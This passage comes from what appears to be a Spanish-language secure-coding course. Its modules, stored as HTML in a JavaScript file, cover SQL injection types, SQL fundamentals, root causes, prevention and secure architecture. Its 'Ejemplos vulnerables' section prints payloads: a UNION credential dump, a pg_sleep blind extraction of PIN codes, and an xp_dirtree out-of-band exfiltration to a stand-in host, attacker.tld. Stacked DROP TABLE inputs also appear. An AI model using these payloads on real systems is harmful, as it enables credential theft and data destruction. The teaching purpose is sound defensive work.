          Ejemplos: funciones de red (p. ej., <code>xp_dirtree</code>, <code>UTL_HTTP</code>) para provocar conexiones salientes y filtrar datos.
          Requiere capacidades extendidas y mala configuración de red.
        </p>

        <h3>7. Inyección de Segundo Orden</h3>
        <p>
          La carga maliciosa se almacena y se ejecuta después en otro flujo (otro módulo/rol). 
          Por ejemplo, datos de perfil guardados con contenido peligroso que más tarde se concatenan en una consulta interna.
          Se detalla más en el módulo de casos avanzados.
        </p>

        <h2>Ejemplos vulnerables</h2>

        <h4>• Inyección UNION</h4>
        <pre><code class="language-text">GET /producto?item=0 UNION SELECT username, password FROM users--</code></pre>
        <p>
          Si la consulta original es <code>SELECT nombre, descripcion FROM productos WHERE id = ?</code> y es vulnerable,
          el atacante puede mezclar resultados y ver credenciales en los campos de la UI.
        </p>

        <h4>• Inyección Ciega (basada en tiempo, PostgreSQL)</h4>
        <pre><code class="language-sql">12345' AND (
      SELECT CASE WHEN PIN_CODE LIKE '1%%'
            THEN pg_sleep(5) ELSE pg_sleep(0) END
      FROM cuentas WHERE cuenta=12345
    )--</code></pre>
        <p>Un retraso indica coincidencia; respuestas rápidas indican lo contrario. Repetición = extracción gradual.</p>

        <h4>• Inyección Fuera de Banda (SQL Server, idea simplificada)</h4>
        <pre><code class="language-sql">'; DECLARE @h CHAR(3) = (SELECT TOP 1 LEFT(password,3) FROM users WHERE username='admin');
    EXEC('master..xp_dirtree "\\\\' + @h + '.attacker.tld\\share"');--</code></pre>
        <p>Provoca resolución/red de salida revelando fragmentos de datos en el subdominio solicitado.</p>

        <h2>Ejemplos seguros</h2>
        <ul>
          <li><strong>Consultas preparadas/parametrizadas:</strong> Separan datos del código; evitan <code>UNION</code>, booleanos/tiempo y cierres de comillas.</li>
          <li><strong>Validación de formato/longitud:</strong> Tipos estrictos (números, rangos) y listas blancas para impedir operadores o funciones inesperadas.</li>
          <li><strong>Manejo de errores:</strong> No exponer mensajes SQL detallados; registrar en servidor y mostrar respuestas genéricas.</li>
          <li><strong>Monitoreo y límites:</strong> Timeouts, detección de patrones repetitivos, WAF/IDS con reglas para <code>UNION</code>, <code>SLEEP</code>, etc.</li>
        </ul>

        <h2>Errores comunes</h2>
        <ul>
          <li>Subestimar variantes (solo considerar lo visible en banda).</li>
          <li>Arreglos parciales (proteger un campo y olvidar otros canales: URLs, cookies, cabeceras, APIs).</li>
          <li>Confiar en ocultación: sin errores visibles aún existe blind SQLi.</li>
          <li>Ignorar NoSQL/ORM: también existen inyecciones por operadores (<code>$ne</code>, <code>$regex</code>) o consultas crudas en ORMs.</li>
          <li>Permitir salidas de red desde la BD (facilita OOB).</li>
        </ul>

        <h2>Buenas prácticas</h2>
        <ul>
          <li><strong>Probar cada tipo:</strong> DAST (p. ej., sqlmap) para booleano/tiempo/union/error en entornos de prueba.</li>
          <li><strong>Capa de datos centralizada:</strong> Reutilizar utilidades/métodos parametrizados reduce errores.</li>
          <li><strong>Sanitizar todas las entradas/salidas:</strong> Además de parametrizar, escape defensivo donde aplique.</li>
          <li><strong>Configurar la BD:</strong> Mínimos privilegios, deshabilitar funciones peligrosas, límites de recursos/timeouts.</li>
          <li><strong>Defensa en profundidad:</strong> Código seguro + validación + WAF/IDS + monitoreo de consultas anómalas.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          Las inyecciones <strong>en banda</strong> (clásica, errores) devuelven información directa; las <strong>ciegas</strong> (booleano, tiempo) la infieren por
          comportamiento; <strong>UNION</strong> combina resultados para exfiltrar datos y <strong>OOB</strong> usa canales alternativos cuando los normales fallan.
          Aun con diferencias tácticas, todas explotan la misma raíz: mezclar entrada de usuario con código SQL.
          La solución universal: <strong>parametrizar</strong> y <strong>validar</strong>, reforzando con ocultación de errores, mínimos privilegios, monitoreo y WAF.
        </p>
        <p>
          En el siguiente módulo veremos fundamentos de SQL y acceso a datos para cimentar el porqué de estas fallas y cómo prevenirlas en detalle.
        </p>
      `
    },
    'fundamentos-sql-y-acceso': {
    id: 'fundamentos-sql-y-acceso',
    title: 'Fundamentos de SQL y Acceso a Datos',
    description: 'Revisa las bases del lenguaje SQL, cómo las aplicaciones construyen consultas y el papel de drivers y ORMs en la seguridad de las consultas.',
    category: 'sqli',
    htmlContent: `
        <h2>Introducción</h2>
        <p>
          Para entender mejor la inyección SQL, es necesario conocer cómo funciona SQL y el acceso a bases de datos de forma legítima.
          En este módulo se revisan los fundamentos del lenguaje SQL, cómo las aplicaciones interactúan con las bases de datos y qué ocurre desde que un usuario envía un dato hasta que la base de datos responde.
          Se explican conceptos básicos (base de datos relacional, consulta SQL, estructura de una tabla) y los mecanismos de conexión (APIs, drivers) que los lenguajes usan para enviar consultas.
        </p>

        <h2>¿Qué es SQL y una base de datos relacional?</h2>
        <p>
          SQL (Structured Query Language) es el lenguaje para gestionar y consultar datos en sistemas relacionales (MySQL, PostgreSQL, Oracle, SQL Server).
          Una base de datos relacional organiza información en <em>tablas</em> con <em>filas</em> (registros) y <em>columnas</em> (campos), por ejemplo una tabla <code>Usuarios</code> con <code>id</code>, <code>nombre</code>, <code>email</code>, <code>password</code>.
        </p>
        <p>Operaciones principales (CRUD):</p>
        <ul>
          <li><strong>SELECT</strong> (consulta)</li>
          <li><strong>INSERT</strong> (inserción)</li>
          <li><strong>UPDATE</strong> (actualización)</li>
          <li><strong>DELETE</strong> (eliminación)</li>
        </ul>
        <p>
          Existen además sentencias DDL (p. ej., <code>CREATE TABLE</code>) y otras de control de permisos y transacciones. En el contexto de <strong>inyección SQL</strong>, las de manipulación de datos (DML) son las más relevantes.
        </p>

        <h2>Acceso desde una aplicación web</h2>
        <p>
          Las aplicaciones se conectan mediante una API o <em>driver</em> con credenciales específicas de la base de datos.
          Envían comandos SQL como texto (o en forma preparada) y reciben resultados: conjuntos de datos para <code>SELECT</code> o indicadores de éxito para modificaciones.
          Ejemplos: PHP (mysqli/PDO), Java (JDBC), Python (psycopg2/PyMySQL), .NET (ADO.NET).
        </p>

        <h2>Estructura básica de una consulta SELECT</h2>
        <pre><code class="language-sql">SELECT columnas
    FROM tabla
    WHERE condición
    ORDER BY criterio;</code></pre>
        <ul>
          <li><strong>SELECT</strong>: columnas a recuperar (<code>*</code> para todas).</li>
          <li><strong>FROM</strong>: tabla(s) de origen.</li>
          <li><strong>WHERE</strong> (opcional): filtro booleado (p. ej., <code>category = 'Garden'</code>).</li>
          <li><strong>ORDER BY</strong> (opcional): orden del resultado.</li>
        </ul>
        <p>
          Otras cláusulas frecuentes: <code>JOIN</code>, <code>GROUP BY</code>, <code>HAVING</code>. La inyección SQL suele enfocarse en valores de <code>WHERE</code>, aunque también puede afectar nombres de columnas/tablas u otras cláusulas si se inserta entrada del usuario allí.
        </p>

        <h2>¿Dónde encaja la entrada del usuario?</h2>
        <ul>
          <li>Inicio de sesión: usuario/contraseña en un <code>SELECT</code> de verificación.</li>
          <li>Búsqueda: texto de búsqueda en la cláusula <code>WHERE</code>.</li>
          <li>Registro: datos en un <code>INSERT</code>.</li>
        </ul>
        <p>Ejemplo (pseudocódigo) <em>inseguro</em> por concatenación:</p>
        <pre><code class="language-text">consulta = "SELECT * FROM Usuarios WHERE nombre = '" + input_nombre + "'";</code></pre>
        <p>
          Si <code>input_nombre</code> contiene una comilla (<code>'</code>), puede cerrar la cadena prematuramente y alterar la sintaxis; este es el principio de la inyección.
        </p>

        <h2>Cómo interpreta el motor de base de datos</h2>
        <p>
          El servidor parsea y planea la consulta (sintaxis, permisos, plan de ejecución). No conoce la “intención” del programador: si recibe
          <code>WHERE nombre = 'Carlos' OR '1'='1'</code> (verdadero), ejecutará la instrucción y devolverá todas las filas que cumplan la condición resultante.
        </p>

        <h2>Escape histórico vs. prácticas modernas</h2>
        <p>
          Antes se usaban funciones de <em>escape</em> (p. ej., duplicar comillas en <code>O''Brian</code>, <code>mysql_real_escape_string()</code>).
          Confiar en escape manual es propenso a errores; por ello se recomiendan <strong>consultas parametrizadas</strong> como enfoque estándar.
        </p>

        <h2>Acceso a datos moderno con ORMs</h2>
        <p>
          Los ORMs (Hibernate, Entity Framework, Django ORM, SQLAlchemy) permiten manipular datos con objetos y suelen parametrizar internamente, reduciendo el riesgo de inyección SQL si se usan correctamente.
          Aun así, conocer SQL ayuda a entender las consultas generadas y evitar introducir texto crudo inseguro.
        </p>

        <h2>Ejemplos vulnerables</h2>
        <h3>Búsqueda de usuario por email (Python + sqlite3)</h3>
        <pre><code class="language-python">import sqlite3
    conn = sqlite3.connect('miapp.db')
    email = input("Ingrese su email: ")
    query = f"SELECT * FROM usuarios WHERE email = '{email}'"
    cursor = conn.execute(query)
    resultados = cursor.fetchall()</code></pre>
        <p>
          Si el usuario ingresa <code>algo' OR '1'='1</code>, la consulta se vuelve:
        </p>
        <pre><code class="language-sql">SELECT * FROM usuarios WHERE email = 'algo' OR '1'='1';</code></pre>
        <p>La condición siempre es verdadera y devuelve todos los usuarios.</p>

        <h3>Creación de tabla con nombre dinámico (Java)</h3>
        <pre><code class="language-java">String tableName = userInput;
    Statement stmt = connection.createStatement();
    stmt.executeUpdate("CREATE TABLE " + tableName + " (id INT)");</code></pre>
        <p>Entrada maliciosa: <code>secure; DROP TABLE usuarios;--</code> &rarr; <em>consultas apiladas</em> con efectos destructivos.</p>

        <h2>Ejemplos seguros</h2>
        <h3>Búsqueda por email parametrizada (sqlite3)</h3>
        <pre><code class="language-python">conn = sqlite3.connect('miapp.db')
    email = input("Ingrese su email: ")
    cursor = conn.execute("SELECT * FROM usuarios WHERE email = ?", (email,))
    resultados = cursor.fetchall()</code></pre>
        <p>
          El marcador <code>?</code> separa datos del SQL; la cadena del usuario se trata como literal seguro.
        </p>

        <h3>Creación de tabla con validación (Java)</h3>
        <pre><code class="language-java">String tableName = userInput;
    if (!tableName.matches("[A-Za-z0-9_]+")) {
        throw new IllegalArgumentException("Nombre de tabla inválido");
    }
    PreparedStatement pst = connection.prepareStatement("CREATE TABLE " + tableName + " (id INT)");
    pst.executeUpdate();</code></pre>
        <p>
          Para identificadores (nombres de tabla/columna) no se usan parámetros; se requiere validación estricta o listas permitidas.
        </p>

        <h3>ORMs en acción (SQLAlchemy)</h3>
        <pre><code class="language-python">user = session.query(User).filter(User.email == email_input).first()</code></pre>
        <p>El ORM genera una consulta parametrizada subyacente.</p>

        <h2>Errores comunes</h2>
        <ul>
          <li>Desconocer el funcionamiento del motor y tratar SQL como texto inofensivo.</li>
          <li>No usar APIs de parametrización disponibles en el lenguaje/plataforma.</li>
          <li>Confiar en escape manual como solución completa.</li>
          <li>Olvidar otros canales de entrada (URL, cookies, cabeceras, archivos, servicios).</li>
          <li>Permitir múltiples sentencias en una llamada (consultas apiladas) sin necesidad.</li>
        </ul>

        <h2>Buenas prácticas</h2>
        <ul>
          <li>Dominar la API de base de datos del lenguaje: <code>prepare/execute</code>, parámetros, tipos.</li>
          <li>Usar tipos de datos correctos y validación previa (numéricos sin comillas, rangos, listas blancas).</li>
          <li>Principio de menor privilegio: cuentas de BD con permisos mínimos necesarios.</li>
          <li>Cifrar/hashear datos sensibles (p. ej., contraseñas) para reducir impacto ante exposición.</li>
          <li>Documentar flujos que interactúan con la base de datos para identificar superficies de riesgo.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          Se revisaron conceptos fundamentales de SQL y del acceso a datos por aplicaciones: tablas, consultas, envío de SQL a través de drivers
          y cómo la entrada del usuario se incorpora a las consultas. Al comprender que el motor interpreta cadenas sin conocer la intención,
          se entiende la base técnica de la <strong>inyección SQL</strong>. También se vio el rol de APIs/ORMs modernos que parametrizan de forma segura.
        </p>
      `
    },
    'raices-sqli': {
      id: 'raices-sqli',
      title: '¿Por qué ocurren las inyecciones SQL?',
      description: 'Explora las causas comunes: concatenación de cadenas, falta de validación, uso indebido de APIs y su relación con decisiones de diseño inseguras.',
      category: 'sqli',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Tras comprender qué es la inyección SQL y cómo se explota, es esencial analizar sus causas raíz desde la perspectiva del desarrollo y del ciclo de vida del software.
          En este módulo identificamos las razones por las que aparecen estas vulnerabilidades: errores de programación, malas prácticas, supuestos incorrectos y condiciones ambientales que facilitan su aparición.
          Cubriremos factores humanos, técnicos y organizativos que con frecuencia conducen a que la inyección SQL permanezca en aplicaciones en producción.
        </p>

        <h2>Explicación general</h2>
        <p>
          La causa fundamental es la mezcla de datos y código: si los valores proporcionados por usuarios se interpolan dentro de una instrucción SQL sin separación clara, un atacante puede manipular la sintaxis y alterar el comportamiento de la consulta.
          Técnicamente, esto es una falta de neutralización de caracteres especiales en comandos SQL (CWE-89). El servidor de base de datos no distingue la "intención" del programador; ejecuta lo que recibe si es sintácticamente válido.
        </p>

        <h2>Causas principales</h2>

        <h3>1. Mezcla de datos y código</h3>
        <p>
          Construir consultas mediante concatenación de strings coloca datos del usuario directamente en el contexto de ejecución. Un simple <code>'</code> puede cerrar una cadena y permitir que el resto de la entrada se interprete como código SQL.
          La separación adecuada entre código y datos (mediante parámetros/prepared statements) evita esta causa raíz.
        </p>

        <h3>2. Validación inadecuada o inexistente</h3>
        <p>
          La ausencia de validación del lado servidor permite que entradas inesperadas lleguen sin control a la capa de datos. Validaciones correctas por tipo, longitud y formato reducen la superficie de ataque, aunque no sustituyen la parametrización.
        </p>

        <h3>3. Uso de métodos inseguros por conveniencia</h3>
        <p>
          Es frecuente que, por rapidez o simplicidad, se elija concatenar una línea en vez de implementar una sentencia preparada. Esta "ruta rápida" deja deuda técnica que puede llegar a producción y convertirse en vulnerabilidad.
        </p>

        <h3>4. Falta de conocimiento o capacitación</h3>
        <p>
          Muchos desarrolladores no reciben formación específica en seguridad. Ejemplos inseguros en tutoriales o código heredado reproducen malos patrones. La ignorancia técnica es una causa directa de inyección SQL.
        </p>

        <h3>5. Supuestos erróneos sobre el entorno</h3>
        <p>
          Creer que un parámetro no puede ser manipulado (URL, cookie, campo oculto) o que una aplicación "interna" es segura conduce a relajaciones en controles. Toda entrada debe considerarse no confiable.
        </p>

        <h3>6. Reutilización de código inseguro y deuda técnica</h3>
        <p>
          Copiar/pegar fragmentos inseguros desde ejemplos o mantener código legacy sin auditoría propaga vulnerabilidades. Sistemas antiguos o librerías desactualizadas pueden no ofrecer mecanismos seguros por defecto.
        </p>

        <h3>7. Complejidad funcional y diseño inadecuado</h3>
        <p>
          Requisitos que exigen SQL dinámico (filtros arbitrarios, ordenamientos por columnas proporcionadas por el usuario, generación dinámica de columnas) complican la implementación segura. Si no se modelan correctamente (listas blancas, query builders seguros), se recurre a concatenación y aparece la vulnerabilidad.
        </p>

        <h3>8. APIs y frameworks inseguros u obsoletos</h3>
        <p>
          Entornos antiguos o drivers sin soporte para parámetros incitan a prácticas inseguras. No actualizar dependencias o usar librerías con fallos conocidos incrementa el riesgo.
        </p>

        <h3>9. Falta de pruebas, revisión y monitoreo</h3>
        <p>
          Ausencia de code review enfocado en seguridad, pruebas dinámicas (DAST) y análisis estático (SAST) permite que vulnerabilidades lleguen a producción sin ser detectadas. Tampoco investigar logs anómalos facilita que un atacante pruebe cargas maliciosas sin ser detectado.
        </p>

        <h2>Escenarios ilustrativos</h2>

        <h3>Escenario A — Código tomado de un tutorial</h3>
        <pre><code class="language-php">$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";</code></pre>
        <p>Falla: el desarrollador copia un ejemplo inseguro sin comprender riesgos. Causa: falta de conocimiento y ejemplos públicos inseguros.</p>

        <h3>Escenario B — Confianza en un entorno interno</h3>
        <p>
          Una app interna permite al usuario escribir una cláusula WHERE completa para flexibilidad. Un empleado malintencionado inserta <code>1=1; DROP TABLE ventas;--</code> y la ejecución borra datos.
          Falla: supuestos de confianza y permisos excesivos en la cuenta de BD.
        </p>

        <h3>Escenario C — Complejidad técnica</h3>
        <p>
          Se construye dinámicamente el ORDER BY según un parámetro de usuario. La lista blanca contiene un bug y permite inyectar payload en el ORDER BY.
          Falla: diseño que no contempla mapas seguros para identificadores dinámicos.
        </p>

        <h3>Escenario D — Código legado</h3>
        <pre><code class="language-vb">sql = "SELECT * FROM Clientes WHERE apellido = '" & request("apellido") & "'"</code></pre>
        <p>Falla: código antiguo sin auditoría; la vulnerabilidad persiste por años.</p>

        <h2>Errores conceptuales frecuentes</h2>
        <ul>
          <li>Culpar al usuario por enviar entradas maliciosas en vez de corregir el código.</li>
          <li>Tratar la seguridad como un añadido tardío en lugar de integrarla en el diseño.</li>
          <li>No actualizar frameworks o librerías que corrigen fallos de seguridad.</li>
          <li>Confiar exclusivamente en mitigaciones parciales (WAF, stored procedures) en lugar de asegurar el código.</li>
          <li>Ignorar señales en logs o patrones inusuales de consultas que pueden indicar pruebas de inyección.</li>
        </ul>

        <h2>Medidas para abordar las causas</h2>
        <ul>
          <li>Políticas y guías de codificación: prohibir concatenaciones de entrada en SQL; exigir prepared statements.</li>
          <li>Formación continua: cursos prácticos, ejemplos seguros en plantillas internas y revisiones de pares con foco en seguridad.</li>
          <li>Integración de herramientas en el pipeline: SAST en cada build, DAST en entornos de prueba y reglas de linting que detecten concatenaciones peligrosas.</li>
          <li>Principio de menor privilegio: cuentas de BD con permisos mínimos; deshabilitar funciones peligrosas si no son necesarias.</li>
          <li>Diseño seguro para requisitos complejos: usar query builders, mapas de columnas permitidas y plantillas predefinidas en lugar de SQL libre.</li>
          <li>Gestión de deuda técnica y refactorización periódica: auditar código legacy y reemplazar patrones inseguros por implementaciones seguras.</li>
          <li>Monitoreo activo: analizar logs y establecer alertas para patrones repetitivos (intentos con <code>OR 1=1</code>, <code>UNION</code>, <code>SLEEP</code>, etc.).</li>
          <li>Entornos separables y datos no reales en dev: minimizar impacto si se explota un entorno de desarrollo/test.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          Las inyecciones SQL surgen por decisiones y fallos concretos: mezclar datos y código, validar mal la entrada, usar APIs inseguras, asumptos erróneos y falta de pruebas o mantenimiento.
          Atacar estas causas raíz requiere educación, prácticas de codificación seguras, revisión continua y controles operativos (privilegios mínimos, monitoreo, actualizaciones).
          Incorporando estas medidas en el ciclo de desarrollo se elimina la mayoría de los vectores que permiten la inyección SQL.
        </p>
      `
    },
    'prevencion-sqli': {
      id: 'prevencion-sqli',
      title: 'Prevención de Inyección SQL',
      description: 'Aprende las defensas efectivas: consultas parametrizadas, uso correcto de ORMs, validación por whitelist y separación de responsabilidades entre código y datos.',
      category: 'sqli',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Este módulo explica las defensas prácticas y comprobadas contra la inyección SQL. La regla de oro es siempre separar datos y código: nunca construir instrucciones SQL concatenando entrada del usuario.
          Describiremos las técnicas principales (consultas parametrizadas, procedimientos almacenados bien escritos, validación por lista blanca, uso correcto de ORMs), consideraciones especiales y ejemplos concretos en varios lenguajes.
        </p>

        <h2>Resumen conceptual</h2>
        <p>
          Todas las contramedidas persiguen un objetivo único: asegurar que los valores proporcionados por usuarios no puedan alterar la estructura de una sentencia SQL. Los mecanismos más sólidos logran esto al tratar los valores como literales (no como parte del código SQL).
        </p>

        <h2>1. Consultas parametrizadas (Prepared Statements)</h2>
        <p>
          Defensa principal y recomendada. La aplicación envía la estructura de la consulta al motor con marcadores (placeholders) y proporciona los valores por separado. El motor ya conoce la gramática de la consulta antes de ver los valores, por lo que estos nunca cambian la estructura.
        </p>

        <h3>Ejemplos</h3>
        <p>PHP (PDO):</p>
        <pre><code class="language-php">$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
    $stmt->execute([$u, $p]);</code></pre>

        <p>Python (psycopg2):</p>
        <pre><code class="language-python">cur.execute("SELECT * FROM users WHERE user = %s AND pass = %s", (u, p))</code></pre>

        <p>C# (.NET):</p>
        <pre><code class="language-csharp">SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE user = @user AND pass = @pass", conn);
    cmd.Parameters.AddWithValue("@user", userInput);
    cmd.Parameters.AddWithValue("@pass", passInput);</code></pre>

        <p><strong>Consideraciones:</strong> Los identificadores (nombres de tabla/columna) no pueden parametrizarse; para esos casos use listas blancas o mapeos seguros.</p>

        <h2>2. Procedimientos almacenados (Stored Procedures)</h2>
        <p>
          Útiles si se diseñan correctamente: los SP son seguros cuando reciben parámetros y no construyen SQL dinámico internamente. Un procedimiento que concatena parámetros para formar SQL dinámico sigue siendo vulnerable.
        </p>

        <h3>Ejemplo vulnerable (no usar):</h3>
        <pre><code class="language-sql">CREATE PROCEDURE getUsersByCity @city NVARCHAR(50) AS
    BEGIN
      DECLARE @query NVARCHAR(MAX);
      SET @query = 'SELECT * FROM Users WHERE city = ''' + @city + '''';
      EXEC(@query);
    END</code></pre>

        <h3>Ejemplo correcto:</h3>
        <pre><code class="language-sql">CREATE PROCEDURE getUsersByCity @city NVARCHAR(50) AS
    BEGIN
      SELECT * FROM Users WHERE city = @city;
    END</code></pre>

        <p>
          <strong>Nota:</strong> puede controlar permisos otorgando a la cuenta de la aplicación permiso únicamente para ejecutar el SP, no para SELECT directo sobre tablas sensibles.
        </p>

        <h2>3. Validación por lista blanca (whitelisting)</h2>
        <p>
          Validar formato, tipo y rango de los datos entrantes. Rechazar cualquier valor que no cumpla las reglas esperadas. Esto es crítico para datos estructurales que no se parametrizan (p. ej. nombre de columna, modo de ordenación).
        </p>

        <h3>Patrones prácticos</h3>
        <ul>
          <li>Campos numéricos: coerción y rango (parseInt + comprobar límites).</li>
          <li>Valores enumerados: mapear entrada a un conjunto predefinido (p. ej. sort: {'name':'name','date':'date'}).</li>
          <li>Identificadores: permitir solo [A-Za-z0-9_]+ y verificar coincidencia con regex.</li>
          <li>Longitud máxima: limitar tamaño para evitar payloads voluminosos.</li>
        </ul>

        <h2>4. Escapado de caracteres (último recurso / capa adicional)</h2>
        <p>
          Escapar puede servir como medida adicional cuando no es posible parametrizar (casos raros), pero no debe ser la defensa principal. Use funciones de escape oficiales del driver o bibliotecas probadas; no implemente escapes caseros.
        </p>

        <h2>5. Uso correcto de ORMs y frameworks</h2>
        <p>
          Aproveche las abstracciones: ORMs y query builders suelen generar SQL parametrizado. Evite ejecutar SQL crudo a menos que sea necesario; si lo hace, use los mecanismos de parametrización del ORM (named parameters, bind variables).
        </p>

        <h3>Buenas prácticas con ORMs</h3>
        <ul>
          <li>Favor métodos de filtrado del ORM en vez de concatenar cadenas SQL.</li>
          <li>Si debe usar SQL crudo, parametrice los valores y valide identificadores.</li>
          <li>Revise la documentación del ORM sobre consultas dinámicas y seguridad.</li>
        </ul>

        <h2>6. Controles en la base de datos y operaciones</h2>
        <ul>
          <li><strong>Principio de menor privilegio:</strong> cuentas de aplicación con permisos mínimos.</li>
          <li><strong>Deshabilitar múltiples statements:</strong> configure drivers para no permitir consultas apiladas si no son necesarias.</li>
          <li><strong>Auditoría y monitoreo:</strong> alertas por patrones anómalos (UNION, OR 1=1, SLEEP, tiempos inusuales).</li>
          <li><strong>WAF:</strong> complemento útil para bloquear intentos básicos, pero no sustituto del código seguro.</li>
        </ul>

        <h2>Ejemplos comparativos: vulnerable vs seguro</h2>

        <h3>Autenticación (PHP) — Vulnerable</h3>
        <pre><code class="language-php">$query = "SELECT * FROM users WHERE username = '".$_POST['user']."' AND password = '".$_POST['pass']."'";</code></pre>

        <h3>Autenticación (PHP) — Seguro (parametrizado)</h3>
        <pre><code class="language-php">$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->bind_param("ss", $_POST['user'], $_POST['pass']);
    $stmt->execute();</code></pre>

        <h3>ORDER BY dinámico — Seguro (lista blanca)</h3>
        <pre><code class="language-java">String orderParam = request.getParameter("order");
    Map<String,String> allowed = Map.of("price","price","date","date");
    String orderSql = allowed.get(orderParam);
    if(orderSql == null) throw new IllegalArgumentException("Orden no válido");
    String query = "SELECT * FROM Products ORDER BY " + orderSql;</code></pre>

        <h3>Nombre de tabla desde usuario — Seguro (lista blanca)</h3>
        <pre><code class="language-python">table = input()
    allowed_tables = {"clientes","productos","ventas"}
    if table not in allowed_tables:
        raise Exception("Tabla no permitida")
    cur.execute(f"COPY {table} TO '/tmp/{table}.csv' DELIMITER ',' CSV")</code></pre>

        <h2>Errores comunes y cómo evitarlos</h2>
        <ul>
          <li>No parametrizar “temporalmente” y olvidar corregir: aplique prácticas seguras desde el inicio.</li>
          <li>Validación solo en cliente: toda validación crítica debe repetirse en el servidor.</li>
          <li>Confiar exclusivamente en WAF o stored procedures sin revisar su implementación.</li>
          <li>Deshabilitar logging de errores críticos o mostrar mensajes de error detallados a usuarios.</li>
        </ul>

        <h2>Integración en el ciclo de desarrollo</h2>
        <ul>
          <li>Incluir reglas de seguridad en code reviews (checklist: ¿parametrizado? ¿validación? ¿identificadores validados?).</li>
          <li>Automatizar SAST en CI para detectar concatenaciones peligrosas y patrones de inyección.</li>
          <li>Ejecutar DAST (scans dinámicos) en entornos de staging antes de deploy.</li>
          <li>Formación continua: plantillas de código seguro y ejemplos en el repositorio interno.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          La defensa efectiva contra la inyección SQL se basa en aplicar de forma consistente prepared statements, validar por lista blanca los datos estructurales, usar ORMs correctamente y aplicar principio de menor privilegio en la BD.
          Complementar con escapes (solo cuando no hay alternativa), monitoreo, y herramientas automatizadas ofrece defensa en profundidad. La corrección en el código fuente debe ser la prioridad: impedir la vulnerabilidad en la raíz es más fiable que depender de mitigaciones externas.
        </p>
      `
    },
    'arquitectura-operaciones': {
      id: 'arquitectura-operaciones',
      title: 'Arquitectura y Operaciones Seguras',
      description: 'Descubre medidas a nivel de arquitectura y operación: controles de acceso a la BD, monitoreo de consultas, WAF como capa adicional y planes de respuesta ante incidentes.',
      category: 'sqli',
      htmlContent: `
          <h2>Introducción</h2>
          <p>
            Este módulo amplía el enfoque desde la codificación segura hacia la arquitectura y la operación. Una arquitectura bien diseñada y una operación vigilante reducen el riesgo y el impacto de la inyección SQL por medio de controles de acceso, segmentación, monitoreo y respuesta.
          </p>

          <h2>Diseño por capas y mínimo privilegio</h2>
          <p>
            La defensa en profundidad exige que cada capa (presentación, negocio, datos) limite lo que entrega a la siguiente y que todas apliquen el principio de mínimo privilegio.
          </p>
          <ul>
            <li><strong>Cuentas de BD con permisos mínimos:</strong> sin privilegios de administración; acceso sólo a tablas y operaciones necesarias.</li>
            <li><strong>Separación de servicios:</strong> acceder a la BD a través de APIs/microservicios que validen entradas y aíslen la base.</li>
            <li><strong>Entornos segregados:</strong> BD en redes internas protegidas por firewall; acceso directo desde internet deshabilitado.</li>
            <li><strong>Compartimentación/multi-tenancy:</strong> instancias, esquemas o bases separadas para reducir impacto cruzado.</li>
          </ul>

          <h2>Abstracciones de datos y tecnologías</h2>
          <p>
            <strong>ORMs y query builders:</strong> favorecen SQL parametrizado y tipos estrictos, reduciendo errores al impedir concatenaciones libres.
            <br />
            <strong>NoSQL:</strong> no usa SQL pero puede sufrir inyecciones de operadores; validar objetos/operadores y usar ODMs que apliquen controles.
          </p>

          <h2>Capas de seguridad adicionales</h2>
          <ul>
            <li><strong>WAF:</strong> filtra patrones conocidos de inyección SQL antes de llegar a la aplicación.</li>
            <li><strong>IDS/IPS:</strong> detecta y/o bloquea comportamientos anómalos a nivel de red y base de datos.</li>
          </ul>

          <h2>Hardening de servidores y base de datos</h2>
          <ul>
            <li>Deshabilitar funciones peligrosas (p. ej., ejecución de comandos del SO, llamadas externas) si no se requieren.</li>
            <li>Restringir errores detallados y banners de versión visibles para usuarios no administradores.</li>
            <li>Mantener SO, motor de BD y dependencias actualizados; ejecutar sólo servicios necesarios.</li>
            <li>Configurar drivers para <em>no</em> permitir múltiples sentencias en una sola llamada si no es imprescindible.</li>
          </ul>

          <h2>Monitoreo y respuesta</h2>
          <ul>
            <li><strong>Logs y métricas:</strong> registrar errores SQL, entradas sospechosas y tiempos de respuesta inusuales (p. ej., retrasos por <code>SLEEP</code>).</li>
            <li><strong>Alertas SIEM:</strong> correlacionar eventos (bloqueos del WAF, errores repetidos) para activar respuesta temprana.</li>
            <li><strong>Gestión de parches:</strong> aplicar actualizaciones ante CVEs relevantes de BD/ORM/controladores.</li>
          </ul>

          <h2>Documentación y estándares</h2>
          <ul>
            <li>Estándares claros: “todas las consultas deben ser parametrizadas; ningún SP concatenará SQL dinámico”.</li>
            <li>Revisiones de arquitectura: definir y auditar roles de BD y superficies de exposición en cada módulo nuevo.</li>
          </ul>

          <h2>Ejemplos y casos</h2>
          <h3>Ejemplo 1 — Cuenta de BD con mínimo acceso</h3>
          <p>
            Usuario <code>app_user</code> con permisos limitados (SELECT/INSERT/UPDATE según tabla, sin DROP/CREATE). Una inyección SQL que intente <code>DROP</code> fallará por permisos.
          </p>

          <h3>Ejemplo 2 — Capa de datos vía procedimientos almacenados</h3>
          <p>
            La aplicación sólo puede ejecutar SPs parametrizados (sin SQL dinámico interno) y no tiene SELECT directo sobre tablas sensibles.
          </p>

          <h3>Ejemplo 3 — Arquitectura cliente → API → BD</h3>
          <p>
            Validación y parametrización en el API centraliza controles y reduce vectores de inyección SQL.
          </p>

          <h3>Ejemplo 4 — WAF</h3>
          <p>
            Bloquea automatizaciones típicas (<code>OR 1=1</code>, <code>UNION SELECT</code>) antes de impactar la aplicación. Complementa al código seguro.
          </p>

          <h3>Ejemplo 5 — Detección por logs</h3>
          <p>
            Picos de errores de sintaxis o patrones repetitivos disparan alertas y permiten contención (bloqueo por firewall, revisión de éxito de consultas).
          </p>

          <h2>Errores comunes</h2>
          <ul>
            <li>Usar cuentas administrativas en la cadena de conexión.</li>
            <li>Dejar credenciales por defecto o configuraciones inseguras en BD.</li>
            <li>Abrir accesos “temporales” en producción y olvidarlos.</li>
            <li>Copiar datos reales a entornos de prueba menos protegidos.</li>
            <li>Desactivar WAF/logs por rendimiento sin plan alterno.</li>
          </ul>

